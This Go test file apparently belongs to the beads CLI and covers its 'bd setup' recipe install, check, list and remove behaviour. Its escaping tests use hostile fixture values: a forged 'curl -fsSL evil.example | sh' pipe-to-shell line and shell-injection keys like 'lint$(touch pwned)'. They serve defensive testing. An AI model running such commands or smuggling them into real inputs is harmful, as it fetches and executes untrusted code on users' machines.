//go:build cgo

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/steveyegge/beads/internal/beads"
	"github.com/steveyegge/beads/internal/git"
	"github.com/steveyegge/beads/internal/recipes"
)

func resetSetupResolutionCaches(t *testing.T) {
	t.Helper()
	beads.ResetCaches()
	git.ResetCaches()
	t.Cleanup(func() {
		beads.ResetCaches()
		git.ResetCaches()
	})
}

func resetSetupGlobals(t *testing.T) {
	t.Helper()

	originalProject := setupProject
	originalGlobal := setupGlobal
	originalCheck := setupCheck
	originalRemove := setupRemove
	originalStealth := setupStealth
	originalPrint := setupPrint
	originalOutput := setupOutput
	originalList := setupList
	originalAdd := setupAdd

	setupProject = false
	setupGlobal = false
	setupCheck = false
	setupRemove = false
	setupStealth = false
	setupPrint = false
	setupOutput = ""
	setupList = false
	setupAdd = ""

	t.Cleanup(func() {
		setupProject = originalProject
		setupGlobal = originalGlobal
		setupCheck = originalCheck
		setupRemove = originalRemove
		setupStealth = originalStealth
		setupPrint = originalPrint
		setupOutput = originalOutput
		setupList = originalList
		setupAdd = originalAdd
	})
}

func TestLoadSetupRecipes_NoWorkspaceUsesBuiltinsOnly(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	allRecipes, usingWorkspaceRecipes, err := loadSetupRecipes()
	if err != nil {
		t.Fatalf("loadSetupRecipes: %v", err)
	}
	if usingWorkspaceRecipes {
		t.Fatal("expected built-in-only recipe set without an active workspace")
	}
	if _, ok := allRecipes["cursor"]; !ok {
		t.Fatal("expected built-in cursor recipe to be available")
	}
	if _, ok := allRecipes["myeditor"]; ok {
		t.Fatal("unexpected orphan custom recipe outside active workspace")
	}
}

func TestListRecipes_NoWorkspaceShowsBuiltinOnlyNote(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	out := captureStdout(t, func() error {
		listRecipes()
		return nil
	})

	if !strings.Contains(out, "cursor") {
		t.Fatalf("expected built-in recipes in output, got:\n%s", out)
	}
	if !strings.Contains(out, "copilot") {
		t.Fatalf("expected copilot recipe in output, got:\n%s", out)
	}
	if strings.Contains(out, "myeditor") {
		t.Fatalf("unexpected orphan custom recipe in output:\n%s", out)
	}
	if !strings.Contains(out, "Note: No active beads workspace found. Showing built-in recipes only.") {
		t.Fatalf("expected built-in-only note in output, got:\n%s", out)
	}
	if !strings.Contains(out, "Hint: "+diagHint()) {
		t.Fatalf("expected diagnostic hint in output, got:\n%s", out)
	}
}

func TestAddRecipe_NoWorkspaceReturnsActiveWorkspaceError(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	err := addRecipe("myeditor", ".myeditor/rules.md")
	if err == nil {
		t.Fatal("expected addRecipe to fail without active workspace")
	}
	if !strings.Contains(err.Error(), activeWorkspaceNotFoundError()) {
		t.Fatalf("expected active-workspace error, got: %v", err)
	}
	if !strings.Contains(err.Error(), diagHint()) {
		t.Fatalf("expected diagnostic hint, got: %v", err)
	}

	if _, statErr := os.Stat(filepath.Join(tmpDir, ".beads", "recipes.toml")); !os.IsNotExist(statErr) {
		t.Fatalf("expected no local recipes.toml, got err=%v", statErr)
	}
}

func TestLookupSetupRecipe_NoWorkspaceIgnoresOrphanCustomRecipes(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	_, err := lookupSetupRecipe("myeditor")
	if err == nil {
		t.Fatal("expected custom recipe lookup to fail without active workspace")
	}
	if !strings.Contains(err.Error(), "workspace-local custom recipes require an active beads workspace") {
		t.Fatalf("expected explicit no-workspace message, got: %v", err)
	}
}

func TestRunRecipe_BuiltinFileRecipeWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("windsurf")
		return nil
	})

	if !strings.Contains(out, "Installing Windsurf integration") {
		t.Fatalf("expected install output, got:\n%s", out)
	}

	installedPath := filepath.Join(tmpDir, ".windsurf", "rules", "beads.md")
	data, err := os.ReadFile(installedPath)
	if err != nil {
		t.Fatalf("ReadFile(%q): %v", installedPath, err)
	}
	if string(data) != recipes.Template {
		t.Fatalf("installed recipe contents did not match template")
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".beads")); !os.IsNotExist(err) {
		t.Fatalf("expected no local .beads directory to be created, got err=%v", err)
	}
}

func TestRunRecipe_KiroWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("kiro")
		return nil
	})

	if !strings.Contains(out, "Installing Kiro CLI integration") {
		t.Fatalf("expected install output, got:\n%s", out)
	}

	installedPath := filepath.Join(tmpDir, ".kiro", "steering", "beads.md")
	data, err := os.ReadFile(installedPath)
	if err != nil {
		t.Fatalf("ReadFile(%q): %v", installedPath, err)
	}
	if string(data) != recipes.Template {
		t.Fatalf("installed Kiro recipe contents did not match template")
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".beads")); !os.IsNotExist(err) {
		t.Fatalf("expected no local .beads directory to be created, got err=%v", err)
	}
}

func TestRunRecipe_CopilotWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("copilot")
		return nil
	})

	if !strings.Contains(out, "GitHub Copilot CLI integration installed") {
		t.Fatalf("expected copilot install output, got:\n%s", out)
	}

	if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")); err != nil {
		t.Fatalf("expected copilot plugin manifest: %v", err)
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".github", "copilot-instructions.md")); err != nil {
		t.Fatalf("expected copilot instructions: %v", err)
	}
}

func TestRunRecipe_CopilotCheckWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	runRecipe("copilot")

	resetSetupGlobals(t)
	setupCheck = true

	out := captureStdout(t, func() error {
		runRecipe("copilot")
		return nil
	})

	if !strings.Contains(out, ".copilot-plugin/plugin.json") {
		t.Fatalf("expected plugin manifest in check output, got:\n%s", out)
	}
	if !strings.Contains(out, ".github/copilot-instructions.md") {
		t.Fatalf("expected instructions file in check output, got:\n%s", out)
	}
}

func TestRunRecipe_CopilotRemoveWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	runRecipe("copilot")

	resetSetupGlobals(t)
	setupRemove = true
	runRecipe("copilot")

	if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")); !os.IsNotExist(err) {
		t.Fatalf("expected plugin manifest to be removed, got err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".github", "copilot-instructions.md")); !os.IsNotExist(err) {
		t.Fatalf("expected copilot instructions to be removed, got err=%v", err)
	}
}

// Remove takes a file recipe's files out and then removes the directory each
// was in if that left it empty, but it never removes one that is a symlink,
// since that unlinks it whatever its target holds: a team's shared
// .windsurf/rules, say, or a .github holding workflows.
func TestRunRecipe_RemoveKeepsDirItDidNotEmpty(t *testing.T) {
	rules := filepath.Join(".windsurf", "rules")
	for _, tt := range []struct {
		name   string
		recipe string
		dir    string // the directory holding the recipe's file
		file   string // the recipe's file
		link   bool   // dir is a symlink to a directory beside the workspace
		mine   bool   // dir holds a file of the user's too
		bare   bool   // bd setup did not run first; dir is one the user made
		kept   bool
	}{
		{name: "linked .windsurf/rules holding a rule of the user's", recipe: "windsurf", dir: rules, file: "beads.md", link: true, mine: true, kept: true},
		{name: "linked .windsurf/rules holding only bd's rule", recipe: "windsurf", dir: rules, file: "beads.md", link: true, kept: true},
		{name: "linked .github holding workflows", recipe: "copilot", dir: ".github", file: "copilot-instructions.md", link: true, mine: true, kept: true},
		{name: "real .windsurf/rules holding a rule of the user's", recipe: "windsurf", dir: rules, file: "beads.md", mine: true, kept: true},
		{name: "real .windsurf/rules holding only bd's rule", recipe: "windsurf", dir: rules, file: "beads.md"},
		{name: "real empty .windsurf/rules, nothing installed", recipe: "windsurf", dir: rules, file: "beads.md", bare: true, kept: true},
	} {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			ws := filepath.Join(root, "ws")
			dir := filepath.Join(ws, tt.dir)
			target := dir
			if tt.link {
				target = filepath.Join(root, "shared")
			}
			for _, d := range []string{target, filepath.Dir(dir)} {
				if err := os.MkdirAll(d, 0o755); err != nil {
					t.Fatal(err)
				}
			}
			if tt.link {
				if err := os.Symlink(target, dir); err != nil {
					t.Skipf("symlink: %v", err)
				}
			}
			mine := filepath.Join(target, "mine.md")
			if tt.mine {
				if err := os.WriteFile(mine, []byte("mine\n"), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			t.Chdir(ws)
			t.Setenv("BEADS_DIR", "")
			resetSetupResolutionCaches(t)
			if !tt.bare {
				resetSetupGlobals(t)
				if err := runRecipe(tt.recipe); err != nil {
					t.Fatalf("bd setup %s: %v", tt.recipe, err)
				}
			}

			resetSetupGlobals(t)
			setupRemove = true
			if err := runRecipe(tt.recipe); err != nil {
				t.Fatalf("bd setup %s --remove: %v", tt.recipe, err)
			}
			if _, err := os.Lstat(filepath.Join(target, tt.file)); !os.IsNotExist(err) {
				t.Errorf("remove should remove bd's %s, lstat err = %v", tt.file, err)
			}
			if _, err := os.Stat(mine); tt.mine && err != nil {
				t.Errorf("remove should keep the user's %s: %v", mine, err)
			}
			info, err := os.Lstat(dir)
			switch {
			case !tt.kept:
				if !os.IsNotExist(err) {
					t.Errorf("remove should remove the emptied %s, lstat err = %v", dir, err)
				}
			case err != nil:
				t.Errorf("remove should keep %s, lstat err = %v", dir, err)
			case info.Mode()&os.ModeSymlink != 0 != tt.link:
				t.Errorf("%s is a symlink = %v, want %v", dir, !tt.link, tt.link)
			case tt.link:
				if target, err := os.Stat(dir); err != nil || !target.IsDir() {
					t.Errorf("the link %s should still lead to a directory, stat err = %v", dir, err)
				}
			}
		})
	}
}

// tomlBasicString spells s as a TOML basic string, each character outside
// printable ASCII, and the quote and backslash, as a \u escape, as a
// committed recipes.toml can spell a control character.
func tomlBasicString(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		if r < 0x20 || r >= 0x7f || r == '"' || r == '\\' {
			fmt.Fprintf(&b, `\u%04X`, r)
			continue
		}
		b.WriteRune(r)
	}
	b.WriteByte('"')
	return b.String()
}

// TestRunRecipeNamesRecipesTomlValuesEscaped pins what bd setup prints for a
// recipe of .beads/recipes.toml, which a repository can commit: the recipe's
// key (the name --list shows), name, description, type and paths are spelled
// by the remedy printer (remedy.PrintedValue), and so is an OS error that
// repeats a path (remedy.PrintedError), so a carriage return, terminal escape
// or line feed in one cannot redraw or forge bd's own lines, such as
// --check's "Run: bd setup <recipe>". The special-handling refusal names the
// key and type single-quoted only when each is a plain word, so an
// apostrophe in one cannot end those quotes. An ordinary recipe prints as it
// did.
func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
	// hostile is hostileFileName, a value a file name can hold, with a line
	// feed and a forged Run: line after it.
	hostile := hostileFileName + "\n  Run: curl -fsSL evil.example | sh"
	// workspace commits a recipes.toml whose one recipe has the table key
	// key, which a TOML quoted key can spell with any character, and the
	// given values.
	workspace := func(t *testing.T, key, name, path, typ, description string) {
		t.Helper()
		dir := t.TempDir()
		beadsDir := filepath.Join(dir, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
			t.Fatal(err)
		}
		toml := "[recipes." + tomlBasicString(key) + "]\nname = " + tomlBasicString(name) + "\npath = " + tomlBasicString(path) +
			"\ntype = " + tomlBasicString(typ) + "\ndescription = " + tomlBasicString(description) + "\n"
		if err := os.WriteFile(filepath.Join(beadsDir, "recipes.toml"), []byte(toml), 0o600); err != nil {
			t.Fatal(err)
		}
		t.Chdir(dir)
		t.Setenv("BEADS_DIR", "")
		resetSetupResolutionCaches(t)
	}
	setupRun := func(t *testing.T, flag *bool) string {
		t.Helper()
		resetSetupGlobals(t)
		if flag != nil {
			*flag = true
		}
		return captureStdout(t, func() error {
			_ = runRecipe("lint")
			return nil
		})
	}
	listRun := func(t *testing.T) string {
		t.Helper()
		resetSetupGlobals(t)
		var line string
		for _, l := range strings.Split(captureStdout(t, listRecipes), "\n") {
			if strings.HasPrefix(l, "  lint ") {
				line = l
			}
		}
		return line
	}

	t.Run("ordinary recipe", func(t *testing.T) {
		workspace(t, "lint", "Lint", "tools/lint.md", "file", "Lint rules")
		for _, step := range []struct {
			name string
			out  func(t *testing.T) string
			want string
		}{
			{"--list", listRun, "  lint          Lint rules                 (user)"},
			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
				"✗ Lint integration not installed\n  Run: bd setup lint\n  Missing: tools/lint.md\n"},
			{"install", func(t *testing.T) string { return setupRun(t, nil) },
				"Installing Lint integration...\n\n✓ Lint integration installed\n  File: tools/lint.md\n"},
			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
				"✓ Lint integration installed\n  File: tools/lint.md\n"},
			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }, "✓ Removed Lint integration\n"},
		} {
			if got := step.out(t); got != step.want {
				t.Errorf("bd setup %s printed\n%q\nwant\n%q", step.name, got, step.want)
			}
		}
	})

	t.Run("hostile recipe", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("a Windows file name cannot hold a control character")
		}
		workspace(t, "lint", hostile, filepath.Join("tools", hostile), "file", hostile)
		for _, step := range []struct {
			name string
			out  func(t *testing.T) string
		}{
			{"--list", listRun},
			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
			{"install", func(t *testing.T) string { return setupRun(t, nil) }},
			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }},
		} {
			out := step.out(t)
			what := "bd setup lint " + step.name
			requireNoTerminalControl(t, what, out)
			requireNamesHostileValue(t, what, out)
			if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
				t.Errorf("%s does not escape the recipe value's line feed:\n%q", what, out)
			}
			if step.name == "--check, not installed" && !strings.Contains(out, "\n  Run: bd setup lint\n") {
				t.Errorf("%s does not print bd's own Run: line:\n%q", what, out)
			}
		}
	})

	t.Run("hostile recipe key", func(t *testing.T) {
		// --list names each recipe by its key, so the whole list is
		// checked, not the lint line listRun picks.
		workspace(t, hostile, "Lint", "tools/lint.md", "file", "Lint rules")
		resetSetupGlobals(t)
		out := captureStdout(t, listRecipes)
		const what = "bd setup --list"
		requireNoTerminalControl(t, what, out)
		requireNamesHostileValue(t, what, out)
		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
			t.Errorf("%s does not escape the recipe key's line feed:\n%q", what, out)
		}
	})

	t.Run("hostile recipe key, --check", func(t *testing.T) {
		// bd setup <recipe> looks a recipe up by its key lowercased, so a
		// lowercase key is one a user can name. --check's Run: line puts
		// the key in its command as one shell word (posix, and windows
		// where that differs), or as a placeholder with the key named
		// escaped after it. The special-handling refusal names it (shown)
		// single-quoted when it is a plain word, as it names an ordinary
		// key, and otherwise escaped with no quotes around it, so neither
		// a $(...) nor an apostrophe, which would end those quotes, runs
		// when the refusal is pasted.
		for _, key := range []struct{ value, posix, windows, shown string }{
			{"lint", "lint", "", "'lint'"},
			{"lint$(touch pwned)", "'lint$(touch pwned)'", `<recipe>  (<recipe>: "lint\x24(touch pwned)")`, `"lint\x24(touch pwned)"`},
			{"lint'; touch pwned; echo '", `<recipe>  (<recipe>: "lint\x27\x3b touch pwned\x3b echo \x27")`, "",
				`"lint\x27\x3b touch pwned\x3b echo \x27"`},
			{"lint\n  run: curl -fssl evil.example | sh", `<recipe>  (<recipe>: "lint\n  run: curl -fssl evil.example \x7c sh")`, "",
				`"lint\n  run: curl -fssl evil.example \x7c sh"`},
		} {
			arg := key.posix
			if runtime.GOOS == "windows" && key.windows != "" {
				arg = key.windows
			}
			workspace(t, key.value, "Lint", "tools/lint.md", "file", "Lint rules")
			resetSetupGlobals(t)
			setupCheck = true
			out := captureStdout(t, func() error {
				_ = runRecipe(key.value)
				return nil
			})
			if want := "✗ Lint integration not installed\n  Run: bd setup " + arg + "\n  Missing: tools/lint.md\n"; out != want {
				t.Errorf("bd setup %q --check printed\n%q\nwant\n%q", key.value, out, want)
			}

			workspace(t, key.value, "Lint", "tools/lint.md", "hooks", "Lint rules")
			resetSetupGlobals(t)
			refusal := captureStderr(t, func() { _ = runRecipe(key.value) })
			if want := "Error: recipe " + key.shown + " has type 'hooks' which requires special handling\n"; refusal != want {
				t.Errorf("the special-handling refusal for %q printed\n%q\nwant\n%q", key.value, refusal, want)
			}
		}
	})

	t.Run("hostile recipe, OS errors", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("a Windows file name cannot hold a control character")
		}
		// A repository can commit a directory, with a file in it, at the
		// path its recipe names: install's write then fails (EISDIR) and
		// --remove's remove (ENOTEMPTY). It can commit a file where the
		// path's directory would go: install's mkdir then fails (ENOTDIR).
		// Each OS error repeats the path.
		for _, step := range []struct {
			name, path, file string
			flag             *bool
		}{
			{"install, write", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), nil},
			{"--remove", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), &setupRemove},
			{"install, create directory", filepath.Join(hostile, "lint.md"), hostile, nil},
		} {
			workspace(t, "lint", "Lint", step.path, "file", "Lint rules")
			if err := os.MkdirAll(filepath.Dir(step.file), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(step.file, nil, 0o600); err != nil {
				t.Fatal(err)
			}
			resetSetupGlobals(t)
			if step.flag != nil {
				*step.flag = true
			}
			var err error
			stdout, stderr := captureStdio(t, func() { err = runRecipe("lint") })
			what := "bd setup lint " + step.name
			if err == nil {
				t.Errorf("%s succeeded; want it to fail on the committed %s", what, step.file)
			}
			requireNoTerminalControl(t, what, stdout+stderr)
			requireNamesHostileValue(t, what, stderr)
			if strings.Contains(stderr, "\n  Run: curl") || !strings.Contains(stderr, `\n  Run: curl`) {
				t.Errorf("%s does not escape the recipe path's line feed in its error:\n%q", what, stderr)
			}
		}
	})

	t.Run("hostile type", func(t *testing.T) {
		workspace(t, "lint", "Lint", "tools/lint.md", hostile, "Lint rules")
		resetSetupGlobals(t)
		setupCheck = true
		out := captureStderr(t, func() { _ = runRecipe("lint") })
		requireNoTerminalControl(t, "bd setup lint --check, special-handling refusal", out)
		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
			t.Errorf("the special-handling refusal does not escape the recipe type's line feed:\n%q", out)
		}

		// An apostrophe in the type would end the single quotes an ordinary
		// type is named in, so the type is named escaped instead.
		workspace(t, "lint", "Lint", "tools/lint.md", "hooks'; touch pwned; echo '", "Lint rules")
		resetSetupGlobals(t)
		out = captureStderr(t, func() { _ = runRecipe("lint") })
		if want := `Error: recipe 'lint' has type "hooks\x27\x3b touch pwned\x3b echo \x27" which requires special handling` + "\n"; out != want {
			t.Errorf("the special-handling refusal for a type holding an apostrophe printed\n%q\nwant\n%q", out, want)
		}
	})
}
